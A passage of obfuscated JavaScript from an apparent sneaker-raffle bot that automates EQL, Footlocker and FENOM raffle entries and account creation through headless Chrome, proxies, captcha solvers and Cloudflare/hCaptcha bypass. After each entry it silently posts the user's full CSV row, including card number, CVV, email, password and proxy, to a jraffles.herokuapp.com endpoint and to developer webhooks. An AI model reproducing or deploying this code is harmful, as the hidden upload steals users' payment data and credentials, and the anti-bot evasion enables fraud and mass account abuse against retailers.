                                    await _0x102c5f['click'](), await _0x102c5f['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0xf09eb2(0x3e8), await _0x130cbd['click']('#stateAutocomplete'), console['log'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Setting\x20Address'), await _0xf09eb2(0x1f4);
                            try {
                                const _0x946086 = await _0x130cbd['$x']('//li[text()=\x22' + _0x410ffb[_0x427b01]['State'] + '\x22]');
                                await _0x946086[0x0]['click']();
                            } catch {
                                throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                            }
                            await _0xf09eb2(0x3e8), await _0xf09eb2(0x1f4), await _0x130cbd['type']('#address1', _0x410ffb[_0x427b01]['Address1'] + '\x20' + _0x410ffb[_0x427b01]['HouseNumber']), await _0xf09eb2(0x1f4), await _0x130cbd['type']('#address2', '' + _0x410ffb[_0x427b01]['Address2']), await _0xf09eb2(0x1f4), await _0x130cbd['type']('#city', '' + _0x410ffb[_0x427b01]['City']), await _0xf09eb2(0x1f4), await _0x130cbd['type']('#postcode', '' + _0x410ffb[_0x427b01]['Zip']), await _0xf09eb2(0x3e8), await _0x130cbd['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xf09eb2(0x3e8), console['log'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x44800f = await _0x130cbd['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x44800f && (await _0x130cbd['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x130cbd['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x130cbd['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xf09eb2(0x4b0), await _0x130cbd['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xf09eb2(0x1f4), await _0x130cbd['keyboard']['type']('' + _0x410ffb[_0x427b01]['CardNumber']), await _0xf09eb2(0x320), await _0x130cbd['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x130cbd['keyboard']['type']('' + _0x410ffb[_0x427b01]['ExpiryDate']), await _0xf09eb2(0x4b0), await _0x130cbd['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x130cbd['keyboard']['type']('' + _0x410ffb[_0x427b01]['CVV']), await _0xf09eb2(0x226), await _0x130cbd['type']('input[name=\x22postalCode\x22]', '' + _0x410ffb[_0x427b01]['Zip']), await _0xf09eb2(0x226));
                            const _0x25f99a = await _0x130cbd['$']('.__PrivateStripeElement');
                            _0x25f99a && (await _0xf09eb2(0x1f4), await _0x130cbd['click']('.__PrivateStripeElement'), await _0x130cbd['click']('.__PrivateStripeElement'), await _0x130cbd['keyboard']['type']('' + _0x410ffb[_0x427b01]['CardNumber']), await _0x130cbd['keyboard']['type']('' + _0x410ffb[_0x427b01]['ExpiryDate']), await _0x130cbd['keyboard']['type']('' + _0x410ffb[_0x427b01]['CVV']));
                            await _0xf09eb2(0x226), await _0x130cbd['click']('#paymentConsent'), await _0xf09eb2(0x226), await _0x130cbd['click']('#termsConsent'), await _0xf09eb2(0x2bc), console['log'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x130cbd['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xf09eb2(0x2710);
                            try {
                                await _0x130cbd['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0xf09eb2(0xbb8), await _0x130cbd['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-15j76c0\x20>\x20button', _0x4b1954 => _0x4b1954['click']()), await _0x130cbd['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-15j76c0\x20>\x20button', _0xf71f3a => _0xf71f3a['click']());
                            } catch {
                            }
                            try {
                                await _0x130cbd['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x20f756 = await _0x130cbd['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x20f756) {
                                    _0x4b4581['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x410ffb[_0x427b01]['Email'] + ',' + _0x410ffb[_0x427b01]['Password'] + ',' + _0x410ffb[_0x427b01]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x15a918() {
                                var _0x5be4e9, _0xd33d95 = ![];
                                for (var _0x1e4c8e = 0x0; _0x1e4c8e < 0x18; _0x1e4c8e++) {
                                    async function _0x35a9a3() {
                                        var _0x5db1f7 = new _0x533159({
                                            'user': _0x1940dd['masterMail'],
                                            'password': _0x1940dd['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x2670d9(_0x36b0fb) {
                                            _0x5db1f7['openBox']('INBOX', ![], _0x36b0fb);
                                        }
                                        _0x5db1f7['once']('ready', function () {
                                            console['log'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x2670d9(function (_0x71afe7, _0x51c9d9) {
                                                console['log'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x71afe7)
                                                    throw _0x71afe7;
                                                _0x5db1f7['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x4b4752, _0x59a8c6) {
                                                    if (!_0x59a8c6 || !_0x59a8c6['length'])
                                                        console['log'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x5db1f7['end']();
                                                    else {
                                                        var _0x1e66c3 = _0x5db1f7['seq']['fetch'](_0x59a8c6, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x1e66c3['on']('message', function (_0x4ccb96, _0x28685d) {
                                                            var _0x5e9fa8 = '(#' + _0x28685d + ')\x20';
                                                            _0x4ccb96['on']('body', function (_0x23c93d, _0x4d4686) {
                                                                _0x6212d5(_0x23c93d, (_0x26b8f2, _0x2675f0) => {
                                                                    if (_0x2675f0['subject']['includes']('code')) {
                                                                        const _0x1b12f0 = _0x2675f0['text']['split']('\x0a\x0a')[0x3], _0x5f4f53 = _0x1b12f0['split']('\x0a')[0x1];
                                                                        _0x5be4e9 = _0x5f4f53;
                                                                    }
                                                                });
                                                            }), _0x4ccb96['once']('end', function () {
                                                            });
                                                        }), _0x1e66c3['once']('error', function (_0x717305) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x1e66c3['once']('end', function () {
                                                            _0x5db1f7['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x5db1f7['once']('error', function (_0x329d53) {
                                            console['log'](_0x4f1d86['red'](_0x329d53['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0xd33d95 = !![];
                                        }), _0x5db1f7['once']('end', async function () {
                                        }), _0x5db1f7['connect']();
                                    }
                                    _0x35a9a3(), await _0xf09eb2(0x1388);
                                    if (_0x5be4e9)
                                        return _0x5be4e9;
                                    if (_0xd33d95)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x1e4c8e == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x15a918(), await _0xf09eb2(0x1f4), await _0x130cbd['type']('#code', '' + code), await _0xf09eb2(0x3e8), await _0x130cbd['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x345c9e => _0x345c9e['click']()), await _0x130cbd['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x130cbd['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x410ffb[_0x427b01]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x4b4581['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x410ffb[_0x427b01]['Email'] + ',' + _0x410ffb[_0x427b01]['Password'] + ',' + _0x410ffb[_0x427b01]['Phone']), _0x694acb = 'no', _0x3ed4cd(_0x410ffb[_0x427b01], _0x8e7b26);
                            var _0x50b09b = await _0x22cd2f(_0x410ffb[_0x427b01], _0x8e7b26, 'dev', ![]), _0xe6ddec = await _0x22cd2f(_0x410ffb[_0x427b01], _0x8e7b26, 'pub', ![]);
                            let _0x3846b6 = _0x410ffb[_0x427b01];
                            try {
                                prxdata = {
                                    'username': _0x1c4b49['replace']('#', ''),
                                    'module': _0x8e7b26['name'],
                                    'entrydata': JSON['stringify'](_0x3846b6),
                                    'proxy': '' + _0x3bb9b6[_0x427b01]
                                };
                                var _0x54adfe = JSON['stringify'](prxdata);
                                let _0x43e90e = { 'headers': { 'content-type': 'application/json' } };
                                await _0x12ee7a['post']('https://jraffles.herokuapp.com/success', _0x54adfe, _0x43e90e);
                            } catch (_0x201a3a) {
                            }
                            const _0x4fe8ab = {
                                'succesDEVMSG': { 'embeds': [_0x50b09b] },
                                'succesPUBMSG': { 'embeds': [_0xe6ddec] }
                            };
                            try {
                                _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x4fe8ab['succesDEVMSG']), await _0xf09eb2(0xc8), await _0x58a176(_0x2faedb, _0x4fe8ab['succesDEVMSG']), await _0xf09eb2(0xc8), await _0x58a176(_0x443f6, _0x4fe8ab['succesPUBMSG']);
                            } catch (_0xf97293) {
                                console['log'](_0x4f1d86['yellow'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xf97293));
                            }
                        } catch (_0x37dacd) {
                            console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20' + _0x37dacd)), _0x4e2e48 = '' + _0x37dacd;
                            var _0x4dfee5 = await _0x22cd2f(_0x410ffb[_0x427b01], _0x8e7b26, 'dev', !![], _0x4e2e48), _0x50b09b = await _0x22cd2f(_0x410ffb[_0x427b01], _0x8e7b26, 'dev', ![]), _0xe6ddec = await _0x22cd2f(_0x410ffb[_0x427b01], _0x8e7b26, 'pub', ![]);
                            const _0x48d7e4 = {
                                'succesDEVMSG': { 'embeds': [_0x50b09b] },
                                'succesPUBMSG': { 'embeds': [_0xe6ddec] }
                            };
                            _0x48d7e4['errorDEV'] = { 'embeds': [_0x4dfee5] };
                            _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x48d7e4['errorDEV']);
                            await _0x58a176(_0x45f55a, _0x48d7e4['errorDEV']);
                            if (!_0x694acb == 'no')
                                _0x694acb = 'yes';
                        } finally {
                            _0x119aeb && _0x119aeb['close']();
                            if (_0x694acb == 'yes' && _0x2af970 != 0x5) {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2af970 + '\x20/\x205)')), _0x427b01 = _0x427b01 - 0x1, _0x2af970 = _0x2af970 + 0x1;
                                continue;
                            }
                            _0x694acb == 'yes' && _0x2af970 >= 0x5 && (_0x3f94a0(_0x410ffb[_0x427b01], _0x8e7b26), _0x694acb = 'no', _0x2af970 = 0x0), console['log']('Waiting\x20for\x20' + _0x1940dd['delay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['delay']);
                        }
                    } else {
                        const _0x11533c = '' + _0x410ffb[_0x427b01]['Url'];
                        if (_0x694acb != 'yes')
                            var _0x694acb = '', _0x2af970 = 0x0;
                        if (_0x410ffb[_0x427b01]['Email'] == '' || _0x410ffb[_0x427b01]['FirstName'] == '' || _0x410ffb[_0x427b01]['LastName'] == '') {
                            console['log'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x410ffb[_0x427b01]['Password'] == '' && (_0x410ffb[_0x427b01]['Password'] = 'JRaffles23!');
                        if (_0x1940dd['useRandomProxy'] = ![])
                            var _0x25566c = _0x3bb9b6[_0x427b01]['split'](':');
                        else
                            var _0x1a7ef9 = Math['round'](Math['random']() * (_0x3bb9b6['length'] - 0x1)), _0x25566c = _0x3bb9b6[_0x1a7ef9]['split'](':');
                        var _0x119aeb;
                        try {
                            _0x119aeb = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x25566c[0x0] + ':' + _0x25566c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x119aeb = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x25566c[0x0] + ':' + _0x25566c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1d0839 = await _0x119aeb['newPage']();
                            await _0x1d0839['authenticate']({
                                'username': '' + _0x25566c[0x2],
                                'password': '' + _0x25566c[0x3]
                            }), console['log'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1d0839['setRequestInterception'](!![]), _0x1d0839['on']('request', _0x540b3b => {
                                _0x540b3b['resourceType']() === 'image' || _0x540b3b['resourceType']() === 'font' || _0x540b3b['resourceType']() === 'media' ? _0x540b3b['abort']() : _0x540b3b['continue']();
                            }), await _0x1d0839['goto'](_0x11533c), await _0x1d0839['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x1d0839['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0xf09eb2(0x7d0), await _0x1d0839['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x1d0839['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0xf09eb2(0x3e8), await _0x1d0839['waitForSelector']('#email'), console['log'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x1d0839['type']('#email', '' + _0x410ffb[_0x427b01]['Email']), await _0xf09eb2(0x352), await _0x1d0839['waitForSelector']('#password'), await _0x1d0839['type']('#password', '' + _0x410ffb[_0x427b01]['Password']), await _0xf09eb2(0x352), await _0x1d0839['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xf09eb2(0x1388);
                            if (!_0x410ffb[_0x427b01]['Url']['includes']('footlocker'))
                                await _0x1d0839['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            try {
                                await _0x1d0839['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x3ed4cd(_0x410ffb[_0x427b01], _0x8e7b26), _0x694acb = 'no';
                                continue;
                            }
                            await _0x1d0839['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0xf09eb2(0x3e8), await _0x1d0839['click']('li[data-value=\x22EU\x20' + _0x410ffb[_0x427b01]['Size'] + '\x22]'), await _0xf09eb2(0x1f4);
                            const _0x1c0d11 = await _0x1d0839['$']('#title\x20>\x20label');
                            await _0xf09eb2(0x12c);
                            _0x1c0d11 && await _0x1c0d11['click']();
                            await _0x1d0839['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x1d0839['focus']('#postcode'), await _0x1d0839['keyboard']['down']('Control'), await _0x1d0839['keyboard']['press']('A'), await _0x1d0839['keyboard']['up']('Control'), await _0x1d0839['keyboard']['press']('Backspace'), await _0x1d0839['keyboard']['type'](_0x410ffb[_0x427b01]['Zip']), await _0xf09eb2(0x60e), await _0x1d0839['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xf09eb2(0x3e8), console['log'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0xf09eb2(0x1f4);
                            const _0x66e8ae = await _0x1d0839['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x66e8ae && (await _0x1d0839['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1d0839['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1d0839['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xf09eb2(0x4b0), await _0x1d0839['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xf09eb2(0x1f4), await _0x1d0839['keyboard']['type']('' + _0x410ffb[_0x427b01]['CardNumber']), await _0xf09eb2(0x320), await _0x1d0839['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x1d0839['keyboard']['type']('' + _0x410ffb[_0x427b01]['ExpiryDate']), await _0xf09eb2(0x4b0), await _0x1d0839['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x1d0839['keyboard']['type']('' + _0x410ffb[_0x427b01]['CVV']), await _0xf09eb2(0x226), await _0x1d0839['type']('input[name=\x22postalCode\x22]', '' + _0x410ffb[_0x427b01]['Zip']), await _0xf09eb2(0x226));
                            const _0x5d2fd4 = await _0x1d0839['$']('.__PrivateStripeElement');
                            _0x5d2fd4 && (await _0x1d0839['click']('#billingName'), await _0x1d0839['click']('#billingName'), await _0x1d0839['type']('#billingName', '' + _0x410ffb[_0x427b01]['NameOnCard']), await _0xf09eb2(0x1f4), await _0x1d0839['click']('.__PrivateStripeElement'), await _0x1d0839['click']('.__PrivateStripeElement'), await _0x1d0839['keyboard']['type']('' + _0x410ffb[_0x427b01]['CardNumber']), await _0x1d0839['keyboard']['type']('' + _0x410ffb[_0x427b01]['ExpiryDate']), await _0x1d0839['keyboard']['type']('' + _0x410ffb[_0x427b01]['CVV']));
                            await _0xf09eb2(0x226), await _0x1d0839['click']('#paymentConsent'), await _0xf09eb2(0x226), await _0x1d0839['click']('#termsConsent'), await _0xf09eb2(0x2bc), console['log'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x1d0839['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xf09eb2(0x2710);
                            try {
                                await _0x1d0839['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0xf09eb2(0xbb8), await _0x1d0839['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x1d10f8 => _0x1d10f8['click']()), await _0x1d0839['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x4c41c5 => _0x4c41c5['click']());
                            } catch {
                            }
                            try {
                                await _0x1d0839['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x3ed4cd(_0x410ffb[_0x427b01], _0x8e7b26);
                            var _0x50b09b = await _0x22cd2f(_0x410ffb[_0x427b01], _0x8e7b26, 'dev', ![]), _0xe6ddec = await _0x22cd2f(_0x410ffb[_0x427b01], _0x8e7b26, 'pub', ![]);
                            let _0x565cd4 = _0x410ffb[_0x427b01];
                            try {
                                prxdata = {
                                    'username': _0x1c4b49['replace']('#', ''),
                                    'module': _0x8e7b26['name'],
                                    'entrydata': JSON['stringify'](_0x565cd4),
                                    'proxy': '' + _0x3bb9b6[_0x427b01]
                                };
                                var _0x54adfe = JSON['stringify'](prxdata);
                                let _0x1938cc = { 'headers': { 'content-type': 'application/json' } };
                                await _0x12ee7a['post']('https://jraffles.herokuapp.com/success', _0x54adfe, _0x1938cc);
                            } catch (_0x38b105) {
                            }
                            const _0x438e13 = {
                                'succesDEVMSG': { 'embeds': [_0x50b09b] },
                                'succesPUBMSG': { 'embeds': [_0xe6ddec] }
                            };
                            try {
                                _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x438e13['succesDEVMSG']), await _0xf09eb2(0xc8), await _0x58a176(_0x2faedb, _0x438e13['succesDEVMSG']), await _0xf09eb2(0xc8), await _0x58a176(_0x443f6, _0x438e13['succesPUBMSG']);
                            } catch (_0x1daea0) {
                                console['log'](_0x4f1d86['yellow'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1daea0));
                            }
                            _0x694acb = 'no';
                        } catch (_0x304937) {
                            console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20' + _0x304937)), _0x4e2e48 = '' + _0x304937;
                            var _0x4dfee5 = await _0x22cd2f(_0x410ffb[_0x427b01], _0x8e7b26, 'dev', !![], _0x4e2e48), _0x50b09b = await _0x22cd2f(_0x410ffb[_0x427b01], _0x8e7b26, 'dev', ![]), _0xe6ddec = await _0x22cd2f(_0x410ffb[_0x427b01], _0x8e7b26, 'pub', ![]);
                            const _0x571e5e = {
                                'succesDEVMSG': { 'embeds': [_0x50b09b] },
                                'succesPUBMSG': { 'embeds': [_0xe6ddec] }
                            };
                            _0x571e5e['errorDEV'] = { 'embeds': [_0x4dfee5] }, _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x571e5e['errorDEV']), await _0x58a176(_0x45f55a, _0x571e5e['errorDEV']), _0x694acb = 'yes';
                        } finally {
                            _0x119aeb && _0x119aeb['close']();
                            if (_0x694acb == 'yes' && _0x2af970 != 0x5) {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x8e7b26['name'] + ']\x20Task\x20' + (_0x427b01 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2af970 + '\x20/\x205)')), _0x427b01 = _0x427b01 - 0x1, _0x2af970 = _0x2af970 + 0x1;
                                continue;
                            }
                            _0x694acb == 'yes' && _0x2af970 >= 0x5 && (_0x3f94a0(_0x410ffb[_0x427b01], _0x8e7b26), _0x694acb = 'no', _0x2af970 = 0x0), console['log']('Waiting\x20for\x20' + _0x1940dd['delay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x3d466b, _0x552746, _0x3b302e) {
                    _0x43efe1['use'](_0x2180a5()), _0x43efe1['use'](_0x46c0dc({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1940dd['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x255e52 = 0x0; _0x255e52 < _0x552746['length']; _0x255e52++) {
                        if (_0x23d619 != 'yes')
                            var _0x23d619 = '', _0x2f141e = 0x0;
                        var _0x5bcb6e;
                        try {
                            await _0xf6702b(_0x552746, _0x255e52);
                        } catch {
                            _0x23d619 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x3e9ae7(_0x3d466b['name'] + '\x20Task\x20' + (_0x255e52 + 0x1) + '\x20/\x20' + _0x552746['length'] + '\x20||\x20File:\x20' + _0x5237bc + '\x20Proxies:\x20' + _0x3c7bd9);
                        var _0x2e9832 = await _0x22cd2f(_0x552746[_0x255e52], _0x3d466b, 'acc', ![]);
                        const _0x3fd9a3 = { 'succesDEVMSG': { 'embeds': [_0x2e9832] } }, _0x2e89a1 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x4c8e8f = Math['round'](Math['random']() * (_0x3b302e['length'] - 0x1)), _0x54000b = _0x3b302e[_0x4c8e8f]['split'](':'), _0xd1744e;
                        try {
                            _0xd1744e = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x54000b[0x0] + ':' + _0x54000b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xd1744e = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x54000b[0x0] + ':' + _0x54000b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1671bb = await _0xd1744e['newPage']();
                            await _0x1671bb['setViewport']({
                                'width': 0x500 + _0x215f62(0x1, 0x32),
                                'height': 0x2d9 + _0x215f62(0x1, 0x32)
                            });
                            const _0x1136d7 = await _0x1671bb['target']()['createCDPSession'](), { windowId: _0x4e649f } = await _0x1136d7['send']('Browser.getWindowForTarget');
                            await _0x1671bb['authenticate']({
                                'username': '' + _0x54000b[0x2],
                                'password': '' + _0x54000b[0x3]
                            }), console['log'](_0x1fc391() + '\x20[' + _0x3d466b['name'] + ']\x20Task\x20' + (_0x255e52 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1671bb['goto']('' + _0x2e89a1, { 'waitUntil': 'networkidle2' }), console['log'](_0x1fc391() + '\x20[' + _0x3d466b['name'] + ']\x20Task\x20' + (_0x255e52 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0xf09eb2(0x1388);
                            var _0x4d9974 = await _0x1671bb['$']('.hcaptcha-box');
                            if (_0x4d9974) {
